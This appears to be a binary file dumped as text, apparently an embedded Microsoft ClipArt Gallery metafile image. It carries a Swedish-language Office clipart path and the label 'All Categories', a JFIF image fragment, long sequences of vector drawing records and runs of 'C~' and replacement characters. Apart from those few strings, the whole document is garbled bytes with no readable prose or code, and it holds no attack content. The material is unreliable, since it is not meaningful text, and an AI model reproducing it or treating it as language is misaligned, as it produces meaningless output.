��$�7uy���鏯��R*���N��/���Sg���䮅7�ᕗ�D��7�����:��s���3��}��M�n;n>�{;�c���M.��TV�s����                                                                                                                                            �����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~      ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������         ����       W  �  �K   	  �%   �
���
���	�������������������������������������������������������������s���a���M���8���8���&�����������������������������������������~���s���i���^���T���J���?���3���&�������|�	�����������������{���u���o���p���t�m�t�P�j�5�e�&�_��Y�	�T���P���M���L���N���W���_���d���f�}�f�}�d�r�`�h�Z�`�R�Y�M�W�H�T�B�R�=�P�7�N�2�L�,�I�'�G�,�=�3�3�:�)�A��G��K��M���L���I���F���B���?���:���6���0���+���%�������������������������������������������������������������������������������������v���k���`���T���G���=���3���)��� �����������������������.�	�/��0���1���1���2���3���4���6���7���9���<���>���?���?���>���<���<���=���?���@��A��D�~�H�w�M�p�S�j�Y�e�`�b�h�`�p�_�}�b���g���l���l���r���z���������x��o��j�-�l�A�n�A�p�H�q�Q�p�Y�n�`�i�f�e�l�`�r�]�y�Y��V���S���P���M���L���M���N���O���P���O���O���M���F���>���7���.��%���,��?�
������������ ���!���"���"���#���%���(���*���,���.���*���'���%���#���������������� ����� �
���	�����������������������������������������������������������������������������������{���w���t���l���e���]���V���N���G���@���9���4���0���+���'���"���������������������������������%���+���0���5���8���:���;���<���;���5���-��%�x��o��a��c�
�d��f���g���h���h���i���j���k���l���l���n���s���{��������������������������������������������������������������������������������������������������������"���,���4���<��?�
�C��F��J��M�!�R�&�W�+�]�(�\�#�[��Y��X��R� �L���E���=���4���)���������������������������������������������"���%���)���/���5���<���C���J���R���Z���c���f���j���o���s���������������������������������������������������������������������� ����������� ��-��9��E��F��G��G�
�]�
�Y���X���X���X���W���Q���I��>��3� �&�+��5��?���G���E��:��0��&�%��-��4��8���9���:���:���:���;���5���0���-���*���'���$��� �����������	��� ���&���,���1���/���&� ����	��
�R��L���F���?���^���a���e���i� �l��q��v�	�z�
���������������
�/��)��#����� �"���&���*���B���Z��p�������~��|���y���v���r���n���i���o���w����������������� ���������'���5���B���6���*��������������������������������������������������������������������&���.� �6��>��G��O��W��^��^��O��A��3��&������ �����������������!��)��1��9�)�@�6�F�D�L�S�P�c�S�l�V�c�V�Z�V�R�V�I�V�@�V�7�U�/�U�'�T�'�U�#�V��V��U��T��S��R�
���
����/��B��E��J��N��R�"�b�%�v�*���5���5���5���4���4���-���'���!�������{��t�
������������ ���&���-���5���>���F���N���V���^���d���k���p���t���x���}�
���������)���3���>���B���G���M���S���Z���b���j���s���w���}�������������������������������������������������������������������������������
������*���9���I���X���h���y���|���~���������{���v���p���j���d���`���]���\���X���S�x�M�m�G�b�@�W�:�L�5�A�1�5�4�5�;�?�B�H�J�Q�S�Z�[�c�c�l�j�v�q����������������������������������������&���7���H���Y���j���{�������������������������������������������������������������������������������=���=���E���M���U���]���e���l���s���z���s���l���e���^���V���O���G���@���@���6���-���$���������
������������������������������������)���2���<���D���M���V���_���i���   -    �    -    -    �   33      -     (   $ ��{���t���y���}�������������������������������������������������������{�   -    �    -    -    �   33      -     .   $ m�u�k�o�g�l�b�i�^�g�V�g�O�h�H�k�A�l�@�n�?�p�>�q�?�s�D�u�J�w�P�y�U�{�\�{�c�{�i�z�m�u�   -    �    -    -    �   33      -     ^   $- O�C�K�B�G�A�B�@�>�@�9�?�5�>�0�>�,�=��:��6��1���,���&��� ���������
����������������������������������������{��������������������������� ���(���/���5���:��>��A�*�C�<�D�O�C�   -    �    -    -    �   33      -     &   $ ��>���?���?���?���?���?���?���?���@���B���C���D���D���C���B���@���>�   -    �    -    -    �   33      -     �   $A ��$���!����������������t��g��c��_��Z�
����.��3��9� �>�!�D�"�I�#�O�$�U�%�[�%�`�&�e�'�j�(�o�(�u�(�z�)���)���)���)���)���)���(���(���'���%���$�   -    �    -    -    �   33      -     F   $! �����������
�b��i��q��z��������������������   -    �    -    -    �   33      -     h   $2 (��������������������������������������������������|�}�t�r�k�g�b�^�W�V�K�N�>�F�2�=�&�4��)���
�#��,�/�7�A�C�S�P�c�_�q�o�}�����������������������������������������������������	���������(���(���   -    �    -    -    �   33      -     *   $ $���$������������
���	���	���
������
�����������������z���t�y�n�q�i�h�c�`�\�Y�T�R�K�L�;�A�*�7��-��%��� ���������%���'���*���,���.���0���2���5���9���9���;���>���B���G���N�
�U��^�!�e�%�o�)�y�1���4���5���7���9���;���<���>���?���A���@���>���;�	�7��5�1�6�F�9�\�>�l�C�|�J���S���X���\���_���c���g���l���s���{�������   -    �    -    -    �   33      -     8   $ o���l�y�i�k�g�]�f�M�b�8�c�!�f�
�j���k���i���i���h���f���`���c���d���c���^��U�,�R�M�U�l�b���q���o���o���   -    �    -    -    �  ���      -     �   $? ��������������������������t���h���^���R���F���;���/������������������������������������l���U���?���*���������/���D���0���0�������������������������%���6���C���O���\���i��������������������������,���W�����������������������������������������   -    �    -    -    �  ���      -     X   $* 
��$� �B� �a����������������	���
������
�������� ��)��2��;��D��>��8��2��-�   -    �    -    -    �   33      -         $ =��>��@��A��B�
������������������
���
�n��{������������������������������������������|���m���`���R� �D��7��a��a�
�   -    �    -    -    �   33      -     "  $� ��s���b���O���=���,������ ��������}���u���k���_��Y�|�R�y�L�w�E�u�>�t�6�s�/�q�(�p�+�r�/�s�3�u�7�v�;�x�?�z�C�}�G��L���Q���U���Z���Y���V���R���O���-���0���5���9���=���F���M���R���U���U���N���H���A���:���B���H���L���Q���T���X���\���a���t��p��l��h��d��`��\��X��U�
�^��f�
�j��j��j�
�)��&���#���;���R���i������������������������������������������������
�x��j��\��M��>��/�   -    �    -    -    �  ���      -     .   $ @�6�;�3�6�1�0�1�*�1�#�2��3��4��5��8��;�"�>�'�A�,�D�1�G�5�K�9�O�@�L�A�F�@�>�@�6�   -    �    -    -    �  ���      -     �   $J ����������������������������������������������������������~���z���w���t���u���w���z���}����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   -    �    -    -    �  ���      -     d  $� ��������������������������v���k���a���^���[���Y���X���V���T���R���O���J���H���H���I���K���L���M���O���S���X���Z���Y���R���L���F���@���:���5���0���,��)�z�&�i�#�W� �W��W��V��V��^��f��n��v��}�����������������������������#���)���1���4���6���6��5��/��(���!��!�� ���
���������������������
���������������������������������������������������� ������
��
�������������������
�����������������������������������}���z���v���r���o���k���e���`���Z��S��M��F��@��:���4���.���)���)��+�	�,��,��.��1��4��6�!�7�'�8�*�9�.�9�2�;�5�?�;�H�;�Q�;�Y�;�b�;�k�;�s�<�{�>��@��I���S���_���l���y���������������������������������   -    �    -    -    �  ���      -     &   $ H���G���C���?���;���0���)���%��� ���&���,���1���7���;���@���D���H���   -    �    -    -    �  ���      -     J   $# ��k���n���q���s���r��_���[���Y���Y���Y���Z���\���]���_��`��a��b��d��g��j��m��p���r���s���t���t���r���o���k���h���e���c���d���f���k�   -    �    -    -    �  ���      -     @   $ `���a���`���]���Y���U���P���K���F���F���A���<���8���3���/���,���)���'���(���+���0���6���:���?���D���I���O���V���]���`���   -    �    -    -    �  ���      -     H   $" ������������������������������������������������������{���{�����������������������������������������������������   -    �    -                        >(N$[!gsy#~'+~/~3{2�3�6�9�>�B�H�N�R�X�Z�T�L�F�A�B|At?p;l5o/r+q.j1\4P9D+>+>�   $l XPXXVcSlPsL{L�N�R�U�Z�^�c�f�j�k�k�e�Y�P�B�9�)�����������t�g�T�F�;�5�+���� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� ���'�2�>�Q�f�z���������������� �'�6�J�^�r������������������������������z�v�o�j�e�a�_�^�^{aocdeXdP_LXPXP^   $- P�T�X�[�^�c�i�o�t�y�|�����������������������������������������������}�x�q�l�g�d�^�V�R�P�P�2   $ =Z7Y2\-`*e*j.o5s:u@uCpCkDg?c:c9h5k3e6b9_=_=Z=Z   $
����!�#�#�"� � D   $  q^vb{b^�X�R�N�G�C�6w-n%aXL>0&� "0>JU!i/w>{F{KwRq^q^R   $' �� �� �� �� �� �� �� �� �� �� �� �� �� �����
���� �� �� �� �� �� �� �� �� �� �� 6   $ ��� �� �� �� �� �� �� ��  � � 	� 	� � � � �� �� �� �� �� ���0   $ MSZ+b8gFjSlhm}n�n�i�n�s�t�uxvfvNu@t3_MM.   $ (� 3� ;� C� I� N� P� M� G� =� 5� +� !� � � � &   $ X� [ ^cgjkkfc� b� `� \� U� W� X� X� Z   $+ �� �� �� �� �� �� �� �� �� �� �� �� �� ����~uokm r v��������� �� �� �� �� �� �� �� �� �� �� ��    $ Q� T� W� \� a� c� c� ^� \� U� Q� Q� <   $ �� x� n� c� W� M� G� @� =� C� I� N� R� T� W� X� X� T� P� L� S� ^� k� v� � �� �� ��                        ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������      C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~   ���������������                  ries c:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf  �         -x� � ��2���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All CategoriesGc:\Program\Vanliga filer\Microsoft Shared\Clipart\cagcat50\PE02484_.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������� ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������            C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~   �������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������� JFIF  H H  �� C 		

  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            �`G��OscQ~j��8yD��
6>��j��l��G=<`L�a .��v�`;��Y[Q9z��ICc�2 k�T�p�������'���N���7�����=��j��P�ԅ(�"��� q�'�2 �h�iO8��A����Mݱrݳ�J)��9��5����Mp��p�[-��y8�E�o`�� `�$g'���Yu?H	N�wI���Qݮ���m�-ìN0'>$Ɛ1�u��r�q����ojZxь�L�Y�� �s����>�s��m�Y@��~�Q^�6���PR��18L���I��m6������KO!�U/*����@���~(�hd$�;
J�+$hg�p0������v�rrT�qot��9�_8��Jٵ�����|F��D���t�jzG�9�dz�6�� VV
@�PT��vp�c�N�
�GNٮ��E�t����� ��}�K1	ZP�$e
ώH�'�d��P��E+��ƊCTK'�t���^�e��Jꈝ�����Lc�?��3�O��a��#jg(�hϿZQU�LU:�cP�Jc�%dy g�O$g/\����:
>�l�rO�~=�w�4�JG\��k'�\��-Á�`t �E\�rIѶ{�eU�=�#lq�X�r1���i_aJ�m������;�"��g��j8"G761�{���&�W��	�����v)�k*����Lg�"�E,~��W�&<x�3�Ѵ]iQP꒢�-��O�^�=�lS��g���8.ܜ�:)�t�^��Ĥg�J)��ߧR��}D��h)LΪ�� 3d� 6C(p�n6�sHm?��1�ٮS�\��� $�I�*���ݐw�i�%Ύ�ґ�E:�W2���6<�`�G:u�
£�j/����ޔ��%�#˸欯��������h�P��	�*��8$rA�'��
�-д. ��#�����6�y�Z�mKW��f4���2���抢���!B��p�8�Q�T�d؄��*jI�F�O� {�5�KI,�*�q����N��U��:CN�������`\���q_<�U���}>��TԌ���uU��]� �9Ҋ)��:ޖ�9�%�e=�(�B6�/f>�͎.�6��D���:{�5�˥|K��(�
W!�q���:Wf'k��5���(� �̒q3�rF��F��Ӻ��z����-�#U}+2.�i� ey� ��W�/2ۍ����}�*Ӌ����_'��Q�d����h���AIS�ˑ�kZ�b�[�Z��0di�T⬑�⌰�A� ���\�3J�d*NIӢ�4d��&�1��s�N��9�f~X��4���j�z=Ń���HQA-$p�`
y��&��
I��e=�3�  $�m�zv�ST®����b�Gl@�%!%[8c�\�#%a�a����`c�6�<2�v��Å���
~[2��f)�MI,��,���􆞃N*�@R�&�Q����b�2��>3� �|�����9�n�M�]O0���Y�̾�|�9�s����t5>�����5���k5]�Uv��.8 xʒ8��V��;j�7��lk����[�'�r��q�s�oӂ����R�[`�I^��f;���EQ�Iny݀�N}�kZ[A�D��?n���^Cn:�2�	�#�>9;x�C]����Uv�J�@��� �����5*:��
�isL!5+I[l�������@�V�j����hK9_)��
��)��7����z�h��S<�Nڌw�v��W눭��)�~��*(H��6<��.<�@98 �A
*ڑ,�4�M��Y�?�	'i wg#ʃ�g�J�N.Tؘ�U�.h�<�9�]^�=i�P�j>ϩj�[�o\�}T�Н�J�K1l�v<cy�rf�~l�`����*�<�Qh�A�t89�39���;� ,Z��� �kj���;�ڹ.!� x������������j�#��H!�E2�s7����|wfqu+��h ���נ�w��7h�J���0` }�M��%��ғ��mY��E�9�ac��g��uN�Բ�i#�3�c���a�t���O,N?�O��A

�Ep�e�҆E�P�9��B��2������ ��Z�9q�1V��_����$wD�\���(&1ǽ�m�Xq�FG� ����#Z�$�t�TVJ�����X����f�T�X�A�ǌ�"�vk[Ş��u�����-Z�A�v��7��u8��EPn�[*T��4����0Ǹ�#�x<� ʾ(iX3aWH���o�H��Oڵ�����u��S�5��%M=CT��8�$E�>2�֓6jSkab���c��X\Q
��Ӿ���� �ӿV�����ܯ1�]���?�ۿ����Y����G�ş�+�zP-�uoCSD֫Q��v�����         ����       )
������������n�G�6�6�4�$������ 
� � 1� C� X� _� [� Sdw'�7�C�O�Y~dqr8w
�
�   �  ��      -    � @   $ ;� F� L� Q� X_g#t $������ �� �� �� �� �� �{ �� �{ |� l� [� I� =� ;� ;�    �  ���      -    � 6   $ �b�y������+�6�8�9�=�I�X�d�v�w�vgq4H+1�?�L�b�b   �  ?��      -    � d   $0 � �~ �t �w �| �r }r qu jk _g Ko <p -| � #� &� (� &� aw��������������2&F2S7a=iDkQi`fsa�b�q���f���w�3�� �� �� �� �   �  �Ÿ      -    � R   $' �������������1�S�^�t��������������������������������z�_�>�!#
 L� P� V� c� f� c� [� P� L� L�    �  �Ÿ      -    �    $ �)�.�/�&������)�)   $ ��� �� �� �� �� � 
� � ��   �  ̌�      -    � ,   $  )6CMTYX Q�F�;�,���	   �  ���      -    �    $ �8�C�F�8���   �           -    �    $ @ h O e ] � _ � W � @ h @ h >   $  �  � ) � 0 � : � @ � E � H � L � T � ] � b � b � ` U P � G � < � 5 � * � $ � * � * � % �  �  �  �  �  �    $	 e 	r 	{ � { $o $g e 	e 	   $ _ � h � m � j � _ � _ � _ �    $
� � � � � 	� � � � $   $ � � (3
?K
"*)22879;7>3B+GN
U�\�e�k�o�r�t�t|tppckTbCX3L B:2� +� $� � � 
�
����������������(   $ i�r���������������������������t�i�i�"   $ 	����#�)�/�/�(����	�	�	�&   $ 9EBMGTN]TeYn^udcval]cVZQSOMGE9E9E(   $ W>^FeMmTt\zck�s�y�n�bxVqPiHcB^<W>W>R   $' ��(�2�<�D�N�X�a�k�w������'�-�1�6�&����� ������t�g�X�L�?�5�,�%����N   $% `,p4?�F�K�O�T�Z�`�d�d�g�k�p�z���������������x�q�m�n�j�f�a�[�U�R�Jn@_6`,`,*   $ SD^LeUl_rhupyw|���z�t~mshia`[WUQJGSDSDR   $' +>(N$[!gsy#~'+~/~3{2�3�6�9�>�B�H�N�R�X�Z�T�L�F�A�B|At?p;l5o/r+q.j1\4P9D+>+>�   $l XPXXVcSlPsL{L�N�R�U�Z�^�c�f�j�k�k�e�Y�P�B�9�)�����������t�g�T�F�;�5�+���� �� �� �� �� �� �� �� �� �� �� �� �� �� �� �� ���'�2�>�Q�f�z���������������� �'�6�J�^�r������������������������������z�v�o�j�e�a�_�^�^{aocdeXdP_LXPXP^   $- P�T�X�[�^�c�i�o�t�y�|�����������������������������������������������}�x�q�l�g�d�^�V�R�P�P�2   $ =Z7Y2\-`*e*j.o5s:u@uCpCkDg?c:c9h5k3e6b9_=_=Z=Z   $
6�2�-�'��0�0<   $ ��������������������������������������������������������N   $% �1�#����������������"�3�B�M�W�_�h�c�V�?�*�������������������
�������(�-�1�1�1�3�7�9�:�>�F�Q�Z�b�h�n�g�_�S�F|>u6r2v0}-�+�+�)�'���� y�n�f�^�\�Z�c�c0   $ � ������������
����!�#�#�"� � D   $  q^vb{b^�X�R�N�G�C�6w-n%aXL>0&� "0>JU!i/w>{F{KwRq^q^R   $' �� �� �� �� �� �� �� �� �� �� �� �� �� �����
���� �� �� �� �� �� �� �� �� �� �� 6   $ ��� �� �� �� �� �� �� ��  � � 	� 	� � � � �� �� �� �� �� ���0   $ MSZ+b8gFjSlhm}n�n�i�n�s�t�uxvfvNu@t3_MM.   $ (� 3� ;� C� I� N� P� M� G� =� 5� +� !� � � � &   $ X� [ ^cgjkkfc� b� `� \� U� W� X� X� Z   $+ �� �� �� �� �� �� �� �� �� �� �� �� �� ����~uokm r v��������� �� �� �� �� �� �� �� �� �� �� ��    $ Q� T� W� \� a� c� c� ^� \� U� Q� Q� <   $ �� x� n� c� W� M� G� @� =� C� I� N� R� T� W� X� X� T� P� L� S� ^� k� v� � �� �� ��                        M���X���t���������������������������������������������������������������������������������������������������������������������������������������������������������� ���
���
����/��B��E��J��N��R�"�b�%�v�*���5���5���5���4���4���-���'���!�������{��t�
������������������������������������)���2���<���D���M���V���_���i���   -    �    -    -    �   33      -     (   $ ��{���t���y���}�������������������������������������������������������{�   -    �    -    -    �   33      -     .   $ m�u�k�o�g�l�b�i�^�g�V�g�O�h�H�k�A�l�@�n�?�p�>�q�?�s�D�u�J�w�P�y�U�{�\�{�c�{�i�z�m�u�   -    �    -    -    �   33      -     ^   $- O�C�K�B�G�A�B�@�>�@�9�?�5�>�0�>�,�=��:��6��1���,���&��� ���������
����������������������������������������{��������������������������� ���(���/���5���:��>��A�*�C�<�D�O�C�   -    �    -    -    �   33      -     &   $ ��>���?���?���?���?���?���?���?���@���B���C���D���D���C���B���@���>�   -    �    -    -    �   33      -     �   $A ��$���!����������������t��g��c��_��Z�
����.��3��9� �>�!�D�"�I�#�O�$�U�%�[�%�`�&�e�'�j�(�o�(�u�(�z�)���)���)���)���)���)���(���(���'���%���$�   -    �    -    -    �   33      -     F   $! �����������
�b��i��q��z��������������������   -    �    -    -    �   33      -     h   $2 (��������������������������������������������������|�}�t�r�k�g�b�^�W�V�K�N�>�F�2�=�&�4��)���
�#��,�/�7�A�C�S�P�c�_�q�o�}�����������������������������������������������������	���������(���(���   -    �    -    -    �   33      -     *   $ $���$������������
���	���	���
������
�����������������z���t�y�n�q�i�h�c�`�\�Y�T�R�K�L�;�A�*�7��-��%��� ���������%���'���*���,���.���0���2���5���9���9���;���>���B���G���N�
�U��^�!�e�%�o�)�y�1���4���5���7���9���;���<���>���?���A���@���>���;�	�7��5�1�6�F�9�\�>�l�C�|�J���S���X���\���_���c���g���l���s���{�������   -    �    -    -    �   33      -     8   $ o���l�y�i�k�g�]�f�M�b�8�c�!�f�
�j���k���i���i���h���f���`���c���d���c���^��U�,�R�M�U�l�b���q���o���o���   -    �    -    -    �  ���      -     �   $? ��������������������������t���h���^���R���F���;���/������������������������������������l���U���?���*���������/���D���0���0�������������������������%���6���C���O���\���i��������������������������,���W�����������������������������������������   -    �    -    -    �  ���      -     X   $* 
��$� �B� �a����������������	���
������
�������� ��)��2��;��D��>��8��2��-�   -    �    -    -    �   33      -         $ =��>��@��A��B�
������������������
���
�n��{������������������������������������������|���m���`���R� �D��7��a��a�
�   -    �    -    -    �   33      -     "  $� ��s� ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            ��Z���Y���V���R���O���-���0���5���9���=���F���M���R���U���U���N���H���A���:���B���H���L���Q���T���X���\���a���t��p��l��h��d��`��\��X��U�
�^��f�
�j��j��j�
�)��&���#���;���R���i������������������������������������������������
�x��j��\��M��>��/�   -    �    -    -    �  ���      -     .   $ @�6�;�3�6�1�0�1�*�1�#�2��3��4��5��8��;�"�>�'�A�,�D�1�G�5�K�9�O�@�L�A�F�@�>�@�6�   -    �    -    -    �  ���      -     �   $J ����������������������������������������������������������~���z���w���t���u���w���z���}����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   -    �    -    -    �  ���      -     d  $� ��������������������������v���k���a���^���[���Y���X���V���T���R���O���J���H���H���I���K���L���M���O���S���X���Z���Y���R���L���F���@���:���5���0���,��)�z�&�i�#�W� �W��W��V��V��^��f��n��v��}�����������������������������#���)���1���4���6���6��5��/��(���!��!�� ���
���������������������
���������������������������������������������������� ������
��
�������������������
�����������������������������������}���z���v���r���o���k���e���`���Z��S��M��F��@��:���4���.���)���)��+�	�,��,��.��1��4��6�!�7�'�8�*�9�.�9�2�;�5�?�;�H�;�Q�;�Y�;�b�;�k�;�s�<�{�>��@��I���S���_���l���y���������������������������������   -    �    -    -    �  ���      -     &   $ H���G���C���?���;���0���)���%��� ���&���,���1���7���;���@���D���H���   -    �    -    -    �  ���      -     J   $# ��k���n���q���s���r��_���[���Y���Y���Y���Z���\���]���_��`��a��b��d��g��j��m��p���r���s���t���t���r���o���k���h���e���c���d���f���k�   -    �    -    -    �  ���      -     @   $ `���a���`���]���Y���U���P���K���F���F���A���<���8���3���/���,���)���'���(���+���0���6���:���?���D���I���O���V���]���`���   -    �    -    -    �  ���      -     H   $" ������������������������������������������������������{���{�����������������������������������������������������   -    �    -                        ~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~C~   ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������         ����       W  �  �K   	  �%   �
���
���	�������������������������������������������������������������s���a���M���8���8���&�����������������������������������������~���s���i���^���T���J���?���3���&�������|�	�����������������{���u���o���p���t�m�t�P�j�5�e�&�_��Y�	�T���P���M���L���N���W���_���d���f�}�f�}�d�r�`�h�Z�`�R�Y�M�W�H�T�B�R�=�P�7�N�2�L�,�I�'�G�,�=�3�3�:�)�A��G��K��M���L���I���F���B���?���:���6���0���+���%�������������������������������������������������������������������������������������v���k���`���T���G���=���3���)��� �����������������������.�	�/��0���1���1���2���3���4���6���7���9���<���>���?���?���>���<���<���=���?���@��A��D�~�H�w�M�p�S�j�Y�e�`�b�h�`�p�_�}�b���g���l���l���r���z���������x��o��j�-�l�A�n�A�p�H�q�Q�p�Y�n�`�i�f�e�l�`�r�]�y�Y��V���S���P���M���L���M���N���O���P���O���O���M���F���>���7���.��%���,��?�
������������ ���!���"���"���#���%���(���*���,���.���*���'���%���#���������������� ����� �
���	�����������������������������������������������������������������������������������{���w���t���l���e���]���V���N���G���@���9���4���0���+���'���"���������������������������������%���+���0���5���8���:���;���<���;���5���-��%�x��o��a��c�
�d��f���g���h���h���i���j���k���l���l���n���s���{��������������������������������������������������������������������������������������������������������"���,���4���<��?�
�C��F��J��M�!�R�&�W�+�]�(�\�#�[��Y��X��R� �L���E���=���4���)���������������������������������������������"���%���)���/���5���<���C���J���R���Z���c���f���j���o���s���������������������������������������������������������������������� ����������� ��-��9��E��F��G��G�
�]�
�Y���X���X���X���W���Q���I��>��3� �&�+��5��?���G���E��:��0��&�%��-��4��8���9���:���:���:���;���5���0���-���*���'���$��� �����������	��� ���&���,���1���/���&� ����	��
�R��L���F���?���^���a���e���i� �l��q��v�	�z�
���������������
